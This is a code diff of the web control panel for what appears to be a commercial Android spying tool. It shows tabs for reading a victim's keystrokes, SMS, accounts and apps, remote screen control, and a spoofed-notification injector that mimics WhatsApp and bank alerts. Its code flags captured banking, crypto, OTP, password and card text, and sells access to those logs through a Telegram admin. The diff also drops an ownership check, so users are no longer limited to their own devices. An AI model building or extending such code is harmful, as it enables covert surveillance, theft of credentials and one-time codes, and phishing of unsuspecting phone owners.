-                                <textarea id="notifMessage" class="chat-input" placeholder="You have 2 new messages" style="width:100%;padding:10px;border-radius:8px;height:80px;"></textarea>
-                            </div>
-                            <button class="btn-primary-glow" onclick="sendCustomNotification()" style="padding:12px;font-weight:bold;"><i class="fas fa-paper-plane" style="margin-right:8px;"></i>Send Notification to Target</button>
+                    <div id="keylogList" style="display: flex; flex-direction: column; gap: 10px; max-height: 600px; overflow-y: auto; padding-right: 4px;">
+                        <div class="empty-state"><i class="fas fa-keyboard"></i><p>Listening for keystrokes...</p></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 3: Accounts -->
+            <div id="tab-accounts" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
+                            <i class="fas fa-user-circle text-primary-c"></i> Logged In Accounts
+                        </h4>
+                    </div>
+                    <div id="accountsList" style="display: flex; flex-direction: column; gap: 10px;">
+                        <div class="empty-state"><i class="fas fa-user-slash"></i><p>No accounts loaded yet.</p></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 4: Installed Apps -->
+            <div id="tab-apps" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
+                            <i class="fas fa-th text-primary-c"></i> Installed Packages & Applications
+                        </h4>
+                    </div>
+                    <div id="appsList">
+                        <div class="empty-state"><i class="fas fa-box-open"></i><p>Loading application list...</p></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 5: SMS Reader -->
+            <div id="tab-sms" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
+                            <i class="fas fa-envelope text-primary-c"></i> SMS Inbox & Dispatch Stream
+                        </h4>
+                    </div>
+                    <div id="smsListContainer">
+                        <div class="empty-state"><i class="fas fa-envelope"></i><p>No SMS messages found.</p></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 6: Push Notification -->
+            <div id="tab-notification" class="tab-content">
+                <div class="card" style="padding: 24px; max-width: 600px; margin: 0 auto;">
+                    <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 8px;">
+                        <i class="fas fa-paper-plane text-primary-c"></i> Spoofed Push Notification Injector
+                    </h4>
+                    <div style="display: flex; flex-direction: column; gap: 16px;">
+                        <div>
+                            <label class="form-label">Target Package Name</label>
+                            <input type="text" id="notifPackage" class="form-input" placeholder="com.whatsapp or com.facebook.orca" value="com.whatsapp">
                         </div>
+                        <div>
+                            <label class="form-label">Notification Title</label>
+                            <input type="text" id="notifTitle" class="form-input" placeholder="e.g. Bank Security Alert">
+                        </div>
+                        <div>
+                            <label class="form-label">Notification Body Message</label>
+                            <textarea id="notifMessage" class="form-input" style="min-height: 90px; resize: vertical;" placeholder="Your verification code is 849201..."></textarea>
+                        </div>
+                        <button onclick="sendCustomNotification()" class="btn-primary-glow" style="border-radius: var(--radius-pill); padding: 12px 20px; font-weight: 700;">
+                            <i class="fas fa-paper-plane me-1"></i> DISPATCH NOTIFICATION
+                        </button>
                     </div>
                 </div>
             </div>
@@ -314,117 +335,61 @@
         </div>
     </main>
 
+    <!-- Premium Lock Modal (Apple Glass VIP Dialog) -->
+    <div id="premiumLockModal" onclick="if(event.target===this)closeLockModal()" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(4, 4, 6, 0.78); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); z-index: 100000; align-items: center; justify-content: center; padding: 20px;">
+        <div class="glass-modal" style="max-width: 460px; width: 100%; padding: 36px 30px; text-align: center; border-radius: var(--radius-xl);">
+            <div style="width: 68px; height: 68px; background: rgba(255, 59, 48, 0.15); border: 1px solid rgba(255, 59, 48, 0.35); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 8px 30px var(--primary-glow);">
+                <i class="fas fa-lock" style="font-size: 1.8rem; color: var(--primary);"></i>
+            </div>
+            <h3 style="font-size: 1.35rem; font-weight: 800; color: #fff; margin-bottom: 8px; font-family: 'Outfit', sans-serif;">Feature Restricted</h3>
+            <p id="lockModalDescText" style="color: var(--text-secondary); font-size: 0.86rem; margin-bottom: 24px; line-height: 1.5;">This advanced intelligence module requires upgraded permissions.</p>
+            <div style="display: flex; flex-direction: column; gap: 10px;">
+                <a href="https://t.me/abid64x" target="_blank" class="btn-primary-glow" style="display: flex; align-items: center; justify-content: center; gap: 8px; border-radius: var(--radius-pill); padding: 12px 20px; font-size: 0.9rem; text-decoration: none;">
+                    <i class="fab fa-telegram"></i> Contact Admin on Telegram (@abid64x)
+                </a>
+                <button onclick="closeLockModal()" class="btn-ghost" style="border-radius: var(--radius-pill); padding: 10px 20px; font-size: 0.85rem;">
+                    Dismiss
+                </button>
+            </div>
+        </div>
+    </div>
+
     <script>
-    // Verify Firebase Auth state & Admin Access Guard
+    const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];
+    window.userPermissions = {};
+    window.isUserAdmin = false;
+
     fbAuth.onAuthStateChanged(user => {
         if (!user) {
             window.location.replace('login.html');
             return;
         }
 
-        const current_user_email = (user.email || '').toLowerCase();
-        const current_user_uid = user.email ? user.email.replace(/[@.]/g, '_') : user.uid;
-        const target_uid = UID;
-        const isAdmin = ADMIN_EMAILS.map(e => e.toLowerCase()).includes(current_user_email);
-        window.isUserAdmin = isAdmin;
+        const email = (user.email || '').toLowerCase();
+        const uid = user.email ? user.email.replace(/[@.]/g, '_') : user.uid;
 
-        if (!isAdmin && target_uid !== current_user_uid && target_uid !== user.uid) {
-            alert('Access Denied: You can only control your own devices');
-            window.location.replace('login.html');
-            return;
-        }
+        trackUserActivity(user, `Opened Device Control [${DID}]`);
 
-        // Track user activity in Firebase users_meta
-        trackUserActivity(user, 'Accessed Control Panel (' + (DID || 'Device') + ')');
-
-        // Listen to user permissions & role from database
-        fbDb.ref('users_meta/' + current_user_uid).on('value', snap => {
-            const uData = snap.val() || {};
-            window.userPermissions = uData.permissions || {};
-            window.isUserAdmin = isAdmin || uData.role === 'ADMIN';
-
-            const adminBtn = document.getElementById('adminPanelBtn');
-            if (adminBtn) {
-                adminBtn.style.display = window.isUserAdmin ? 'inline-flex' : 'none';
+        fbDb.ref('users_meta/' + uid).on('value', snap => {
+            const meta = snap.val() || {};
+            window.userPermissions = meta.permissions || {};
+            window.isUserAdmin = ADMIN_EMAILS.includes(email) || meta.role === 'ADMIN';
+            
+            const badge = document.getElementById('privacyLockBadge');
+            if (badge) {
+                badge.style.display = (!window.isUserAdmin && window.userPermissions.privacy_screen !== true) ? 'inline-block' : 'none';
             }
-
-            // Update Privacy Screen lock badge
-            const isPrivacyAllowed = window.isUserAdmin || window.userPermissions.privacy_screen === true;
-            const privacyBadge = document.getElementById('privacyLockBadge');
-            if (privacyBadge) {
-                privacyBadge.style.display = isPrivacyAllowed ? 'none' : 'inline-block';
-            }
-
-            // Update lock indicators on tab buttons
-            document.querySelectorAll('.tab-btn').forEach(btn => {
-                const onclickAttr = btn.getAttribute('onclick') || '';
-                const isSms = onclickAttr.includes("'sms'");
-                const isNotif = onclickAttr.includes("'notification'");
-                
-                if (isSms || isNotif) {
-                    const isAllowed = window.isUserAdmin || (isSms && window.userPermissions.sms === true) || (isNotif && window.userPermissions.notification === true);
-                    let lockBadge = btn.querySelector('.lock-badge');
-                    if (!isAllowed) {
-                        if (!lockBadge) {
-                            btn.insertAdjacentHTML('beforeend', ' <span class="lock-badge" style="font-size:0.75rem; color:#ff4757; margin-left:4px;"><i class="fas fa-lock"></i></span>');
-                        }
-                    } else if (lockBadge) {
-                        lockBadge.remove();
-                    }
-                }
-            });
         });
 
-        // Auth and permissions verified -> hide auth loader
-        const loader = document.getElementById('authLoader');
-        if (loader) loader.style.display = 'none';
-
-        // Display user profile badge and Sign Out button in navbar
-        const userBadge = document.getElementById('userBadge');
-        const userEmailNav = document.getElementById('userEmailNav');
-        const userAvatar = document.getElementById('userAvatar');
-        const userAvatarFallback = document.getElementById('userAvatarFallback');
-        const userRoleBadge = document.getElementById('userRoleBadge');
-        const signOutBtn = document.getElementById('signOutBtn');
-
-        if (userBadge) {
-            userBadge.style.display = 'flex';
-            if (userEmailNav) userEmailNav.textContent = user.displayName || user.email || 'User';
-            
-            if (user.photoURL && userAvatar) {
-                userAvatar.src = user.photoURL;
-                userAvatar.style.display = 'block';
-                if (userAvatarFallback) userAvatarFallback.style.display = 'none';
-            }
-            
-            if (userRoleBadge) {
-                if (window.isUserAdmin) {
-                    userRoleBadge.textContent = 'Admin';
-                    userRoleBadge.style.background = 'rgba(255, 71, 87, 0.2)';
-                    userRoleBadge.style.color = '#ff4757';
-                    userRoleBadge.style.border = '1px solid rgba(255, 71, 87, 0.4)';
-                } else {
-                    userRoleBadge.textContent = 'User';
-                    userRoleBadge.style.background = 'rgba(0, 184, 148, 0.2)';
-                    userRoleBadge.style.color = '#00b894';
-                    userRoleBadge.style.border = '1px solid rgba(0, 184, 148, 0.4)';
-                }
-            }
-        }
-        if (signOutBtn) {
-            signOutBtn.style.display = 'inline-flex';
-        }
+        document.getElementById('authLoader').style.display = 'none';
     });
 
-    // Safety loader dismissal fallback
+    // Safety fallback
     setTimeout(() => {
         const loader = document.getElementById('authLoader');
         if (loader && loader.style.display !== 'none') {
-            if (fbAuth.currentUser) {
-                loader.style.display = 'none';
-            } else {
-                window.location.replace('login.html');
-            }
+            if (fbAuth.currentUser) loader.style.display = 'none';
+            else window.location.replace('login.html');
         }
     }, 1500);
 
@@ -436,7 +401,7 @@
 
         fbDb.ref('users_meta/' + uid).once('value', snap => {
             const umeta = snap.val() || {};
-            const loginCount = (umeta.login_count || 0) + (actionName.includes('Login') || actionName.includes('Accessed') ? 1 : 0);
+            const loginCount = (umeta.login_count || 0) + 1;
             const role = isHardcodedAdmin ? 'ADMIN' : (umeta.role || 'USER');
 
             const updatedData = {
@@ -549,7 +514,7 @@
         
         document.getElementById('mainStartIcon').className = 'fas fa-square';
         document.getElementById('mainStartIcon').style.marginLeft = '0px';
-        document.getElementById('statusIndicator').style.background = '#00b894';
+        document.getElementById('statusIndicator').style.background = '#30d158';
         
         // Fetch currently cached screen tree in case it was uploaded before we clicked Start
         devRef.child('screenTree').once('value', s => {
@@ -566,16 +531,11 @@
         
         document.getElementById('mainStartIcon').className = 'fas fa-play';
         document.getElementById('mainStartIcon').style.marginLeft = '2px';
-        document.getElementById('statusIndicator').style.background = '#ff4757';
+        document.getElementById('statusIndicator').style.background = '#ff453a';
         document.getElementById('fpsCount').innerText = '0';
         
         const canvas = document.getElementById('screenCanvas');
-        canvas.innerHTML = '<div class="empty-state" id="screenWait" style="text-align: center; color: #444; pointer-events: none;"><p style="font-size: 0.85rem; font-weight: bold; margin: 0;">Click START to begin<br>screen rendering</p></div>';
-    }
-
-    function togglePrivacyCb() {
-        isPrivacyOn = document.getElementById('privacyCheckbox').checked;
-        devRef.child('screenConfig/privacyScreen').set(isPrivacyOn);
+        canvas.innerHTML = '<div class="empty-state" id="screenWait" style="text-align: center; color: var(--text-muted); pointer-events: none;"><p style="font-size: 0.85rem; font-weight: bold; margin: 0;">Click START to begin<br>screen rendering</p></div>';
     }
 
     function toggleBlockBtnsCb() {
@@ -673,7 +633,7 @@
         
         if (distance > 15) { 
             // It's a swipe
-            let duration = Math.min(Math.max(timeDelta, 100), 1000); // cap duration
+            let duration = Math.min(Math.max(timeDelta, 100), 1000);
             devRef.child('commands/swipe').set({ 
                 x1: actualStartX, 
                 y1: actualStartY, 
@@ -689,7 +649,7 @@
             line.style.top = startRelY + 'px';
             line.style.width = distance + 'px';
             line.style.height = '4px';
-            line.style.background = 'rgba(0, 255, 150, 0.5)';
+            line.style.background = 'rgba(255, 59, 48, 0.7)';
             line.style.transformOrigin = 'left center';
             line.style.transform = `rotate(${Math.atan2(clickY - pointerStartY, clickX - pointerStartX)}rad)`;
             line.style.pointerEvents = 'none';
@@ -785,7 +745,6 @@
         const h = s.val() || {};
         document.getElementById('devBattery').textContent = (h.battery || 0) + '%';
         let online = h.online === true || h.online === 'true' || h.online === 1;
-        // Staleness check: if lastSeen is older than 90s, consider offline
         if (online && h.lastSeen) {
             const age = Date.now() - h.lastSeen;
             if (age > 90000) online = false;
@@ -801,7 +760,6 @@
         return div.innerHTML;
     }
 
-    // Use a single real-time listener instead of re-querying on every child_added
     devRef.child('logs').orderByKey().limitToLast(100).on('value', s => {
         const data = s.val();
         const container = document.getElementById('keylogList');
@@ -817,30 +775,28 @@
             const text = escapeHtml(rawText);
             const time = v.time ? new Date(v.time).toLocaleString() : '';
             
-            // Check if log contains sensitive financial/OTP/Password keywords
             const lower = rawText.toLowerCase();
             const isSensitive = lower.includes('bkash') || lower.includes('nagad') || lower.includes('rocket') || lower.includes('upay') || lower.includes('cellfin') || lower.includes('bank') || lower.includes('binance') || lower.includes('trustwallet') || lower.includes('metamask') || lower.includes('crypto') || lower.includes('paypal') || lower.includes('password') || lower.includes('pin') || lower.includes('passcode') || lower.includes('otp') || lower.includes('code') || lower.includes('verification') || lower.includes('cvv') || lower.includes('card') || rawText.includes('[SMS RECEIVED]');
 
             let highlightStyle = '';
             if (rawText.includes('🔥 [KEYBOARD]')) {
-                highlightStyle = 'border-color: #ff4757; background: rgba(255, 71, 87, 0.05);';
+                highlightStyle = 'border-color: #ff453a; background: rgba(255, 69, 58, 0.08);';
             } else if (isSensitive) {
-                highlightStyle = 'border-color: #ffa502; background: rgba(255, 165, 2, 0.05);';
+                highlightStyle = 'border-color: #ffd60a; background: rgba(255, 214, 10, 0.08);';
             } else if (rawText.includes('ScreenText]')) {
-                highlightStyle = 'border-color: #1e90ff; background: rgba(30, 144, 255, 0.05);';
+                highlightStyle = 'border-color: #0a84ff; background: rgba(10, 132, 255, 0.08);';
             } else if (rawText.includes('[SMS RECEIVED]')) {
-                highlightStyle = 'border-color: #2ed573; background: rgba(46, 213, 115, 0.05);';
+                highlightStyle = 'border-color: #30d158; background: rgba(48, 209, 88, 0.08);';
             }
             
             if (isSensitive && !isAllowed) {
-                // Render 100% Blur & Lock Banner
                 h += `
-                <div class="keylog-entry" style="border-color:#ff4757; background:rgba(255,71,87,0.08); position:relative; overflow:hidden; padding:15px;" onclick="showLockModal('Sensitive Financial & Password logs are restricted for free accounts.')">
+                <div class="keylog-entry" style="border-color:#ff453a; background:rgba(255,69,58,0.08); position:relative; overflow:hidden; padding:15px; border-radius: 12px;" onclick="showLockModal('Sensitive Financial & Password logs are restricted for free accounts.')">
                     <div style="filter: blur(8px); opacity: 0.3; user-select: none; pointer-events: none;">
                         <div class="keylog-text">🔒 SENSITIVE LOG REDACTED - FINANCIAL / PASSWORD DETECTED [REDACTED_TEXT]</div>
                         <div class="keylog-time">${time}</div>
                     </div>
-                    <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; color: #ff4757; font-size: 0.82rem; background: rgba(18,18,30,0.85); cursor: pointer;">
+                    <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; color: #ff453a; font-size: 0.82rem; background: rgba(10,8,12,0.88); cursor: pointer;">
                         <i class="fas fa-lock" style="font-size: 1rem;"></i> FINANCIAL / OTP / PASSWORD LOG LOCKED (Click to Unlock)
                     </div>
                 </div>`;
@@ -861,9 +817,9 @@
 
             const container = document.getElementById('keylogList');
             if (isSensitive && !isAllowed) {
-                const h = `<div class="keylog-entry" style="border-color:#ff4757; background:rgba(255,71,87,0.08); position:relative; overflow:hidden; padding:15px;" onclick="showLockModal('Clipboard Sensitive Data is restricted for free accounts.')">
+                const h = `<div class="keylog-entry" style="border-color:#ff453a; background:rgba(255,69,58,0.08); position:relative; overflow:hidden; padding:15px; border-radius: 12px;" onclick="showLockModal('Clipboard Sensitive Data is restricted for free accounts.')">
                     <div style="filter: blur(8px); opacity: 0.3; user-select: none; pointer-events: none;"><div class="keylog-app"><i class="fas fa-clipboard"></i> CLIPBOARD</div><div class="keylog-text">[REDACTED SENSITIVE CLIPBOARD DATA]</div></div>
-                    <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; color: #ff4757; font-size: 0.82rem; background: rgba(18,18,30,0.85); cursor: pointer;">
+                    <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; color: #ff453a; font-size: 0.82rem; background: rgba(10,8,12,0.88); cursor: pointer;">
                         <i class="fas fa-lock"></i> SENSITIVE CLIPBOARD DATA LOCKED
                     </div>
                 </div>`;
@@ -896,11 +852,11 @@
         if (!data) { container.innerHTML = '<div class="empty-state"><i class="fas fa-box-open"></i><p>No apps found.</p></div>'; return; }
         
         let items = Array.isArray(data) ? data : Object.values(data);
-        let h = '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">';
+        let h = '<div style="display:grid;grid-template-columns:repeat(auto-fill, minmax(240px, 1fr));gap:12px;">';
         items.forEach(app => {
             const name = app.name || 'Unknown App';
             const pkg = app.package || 'unknown.package';
-            h += `<div style="background:var(--card-bg-hover);padding:10px;border-radius:8px;border:1px solid var(--border-color);"><div style="font-weight:600;font-size:0.9rem;color:#fff;margin-bottom:4px;">${name}</div><div style="font-size:0.7rem;color:var(--text-muted);word-break:break-all;">${pkg}</div></div>`;
+            h += `<div style="background:rgba(255,255,255,0.035);padding:14px;border-radius:12px;border:1px solid var(--border);"><div style="font-weight:700;font-size:0.88rem;color:#fff;margin-bottom:4px;">${name}</div><div style="font-size:0.72rem;color:var(--text-muted);word-break:break-all;font-family:'JetBrains Mono',monospace;">${pkg}</div></div>`;
         });
         h += '</div>';
         container.innerHTML = h;
@@ -913,7 +869,6 @@
         if (!data) { container.innerHTML = '<div class="empty-state"><i class="fas fa-envelope"></i><p>No SMS found.</p></div>'; return; }
         
         let items = Array.isArray(data) ? data : Object.values(data);
-        // Sort items by time descending (if 'time' is available)
         items.sort((a, b) => (b.time || 0) - (a.time || 0));
         
         let h = '<div style="display:flex;flex-direction:column;gap:12px;">';
@@ -927,12 +882,12 @@
             const iconClass = isInbox ? 'fa-arrow-down' : 'fa-arrow-up';
             
             h += `
-            <div style="background:var(--card-bg-hover);padding:15px;border-radius:8px;border-left:4px solid ${iconColor};">
+            <div style="background:rgba(255,255,255,0.035);padding:16px;border-radius:14px;border-left:4px solid ${iconColor};border:1px solid var(--border);border-left-width:4px;">
                 <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
-                    <div style="font-weight:bold;color:#fff;"><i class="fas ${iconClass}" style="margin-right:6px;font-size:0.8rem;color:${iconColor};"></i>${sender}</div>
-                    <div style="font-size:0.75rem;color:var(--text-muted);">${time}</div>
+                    <div style="font-weight:700;color:#fff;"><i class="fas ${iconClass}" style="margin-right:6px;font-size:0.8rem;color:${iconColor};"></i>${sender}</div>
+                    <div style="font-size:0.72rem;color:var(--text-muted);">${time}</div>
                 </div>
-                <div style="font-size:0.9rem;color:#ccc;white-space:pre-wrap;word-break:break-word;">${body}</div>
+                <div style="font-size:0.88rem;color:#ddd;white-space:pre-wrap;word-break:break-word;line-height:1.45;">${body}</div>
             </div>`;
         });
         h += '</div>';
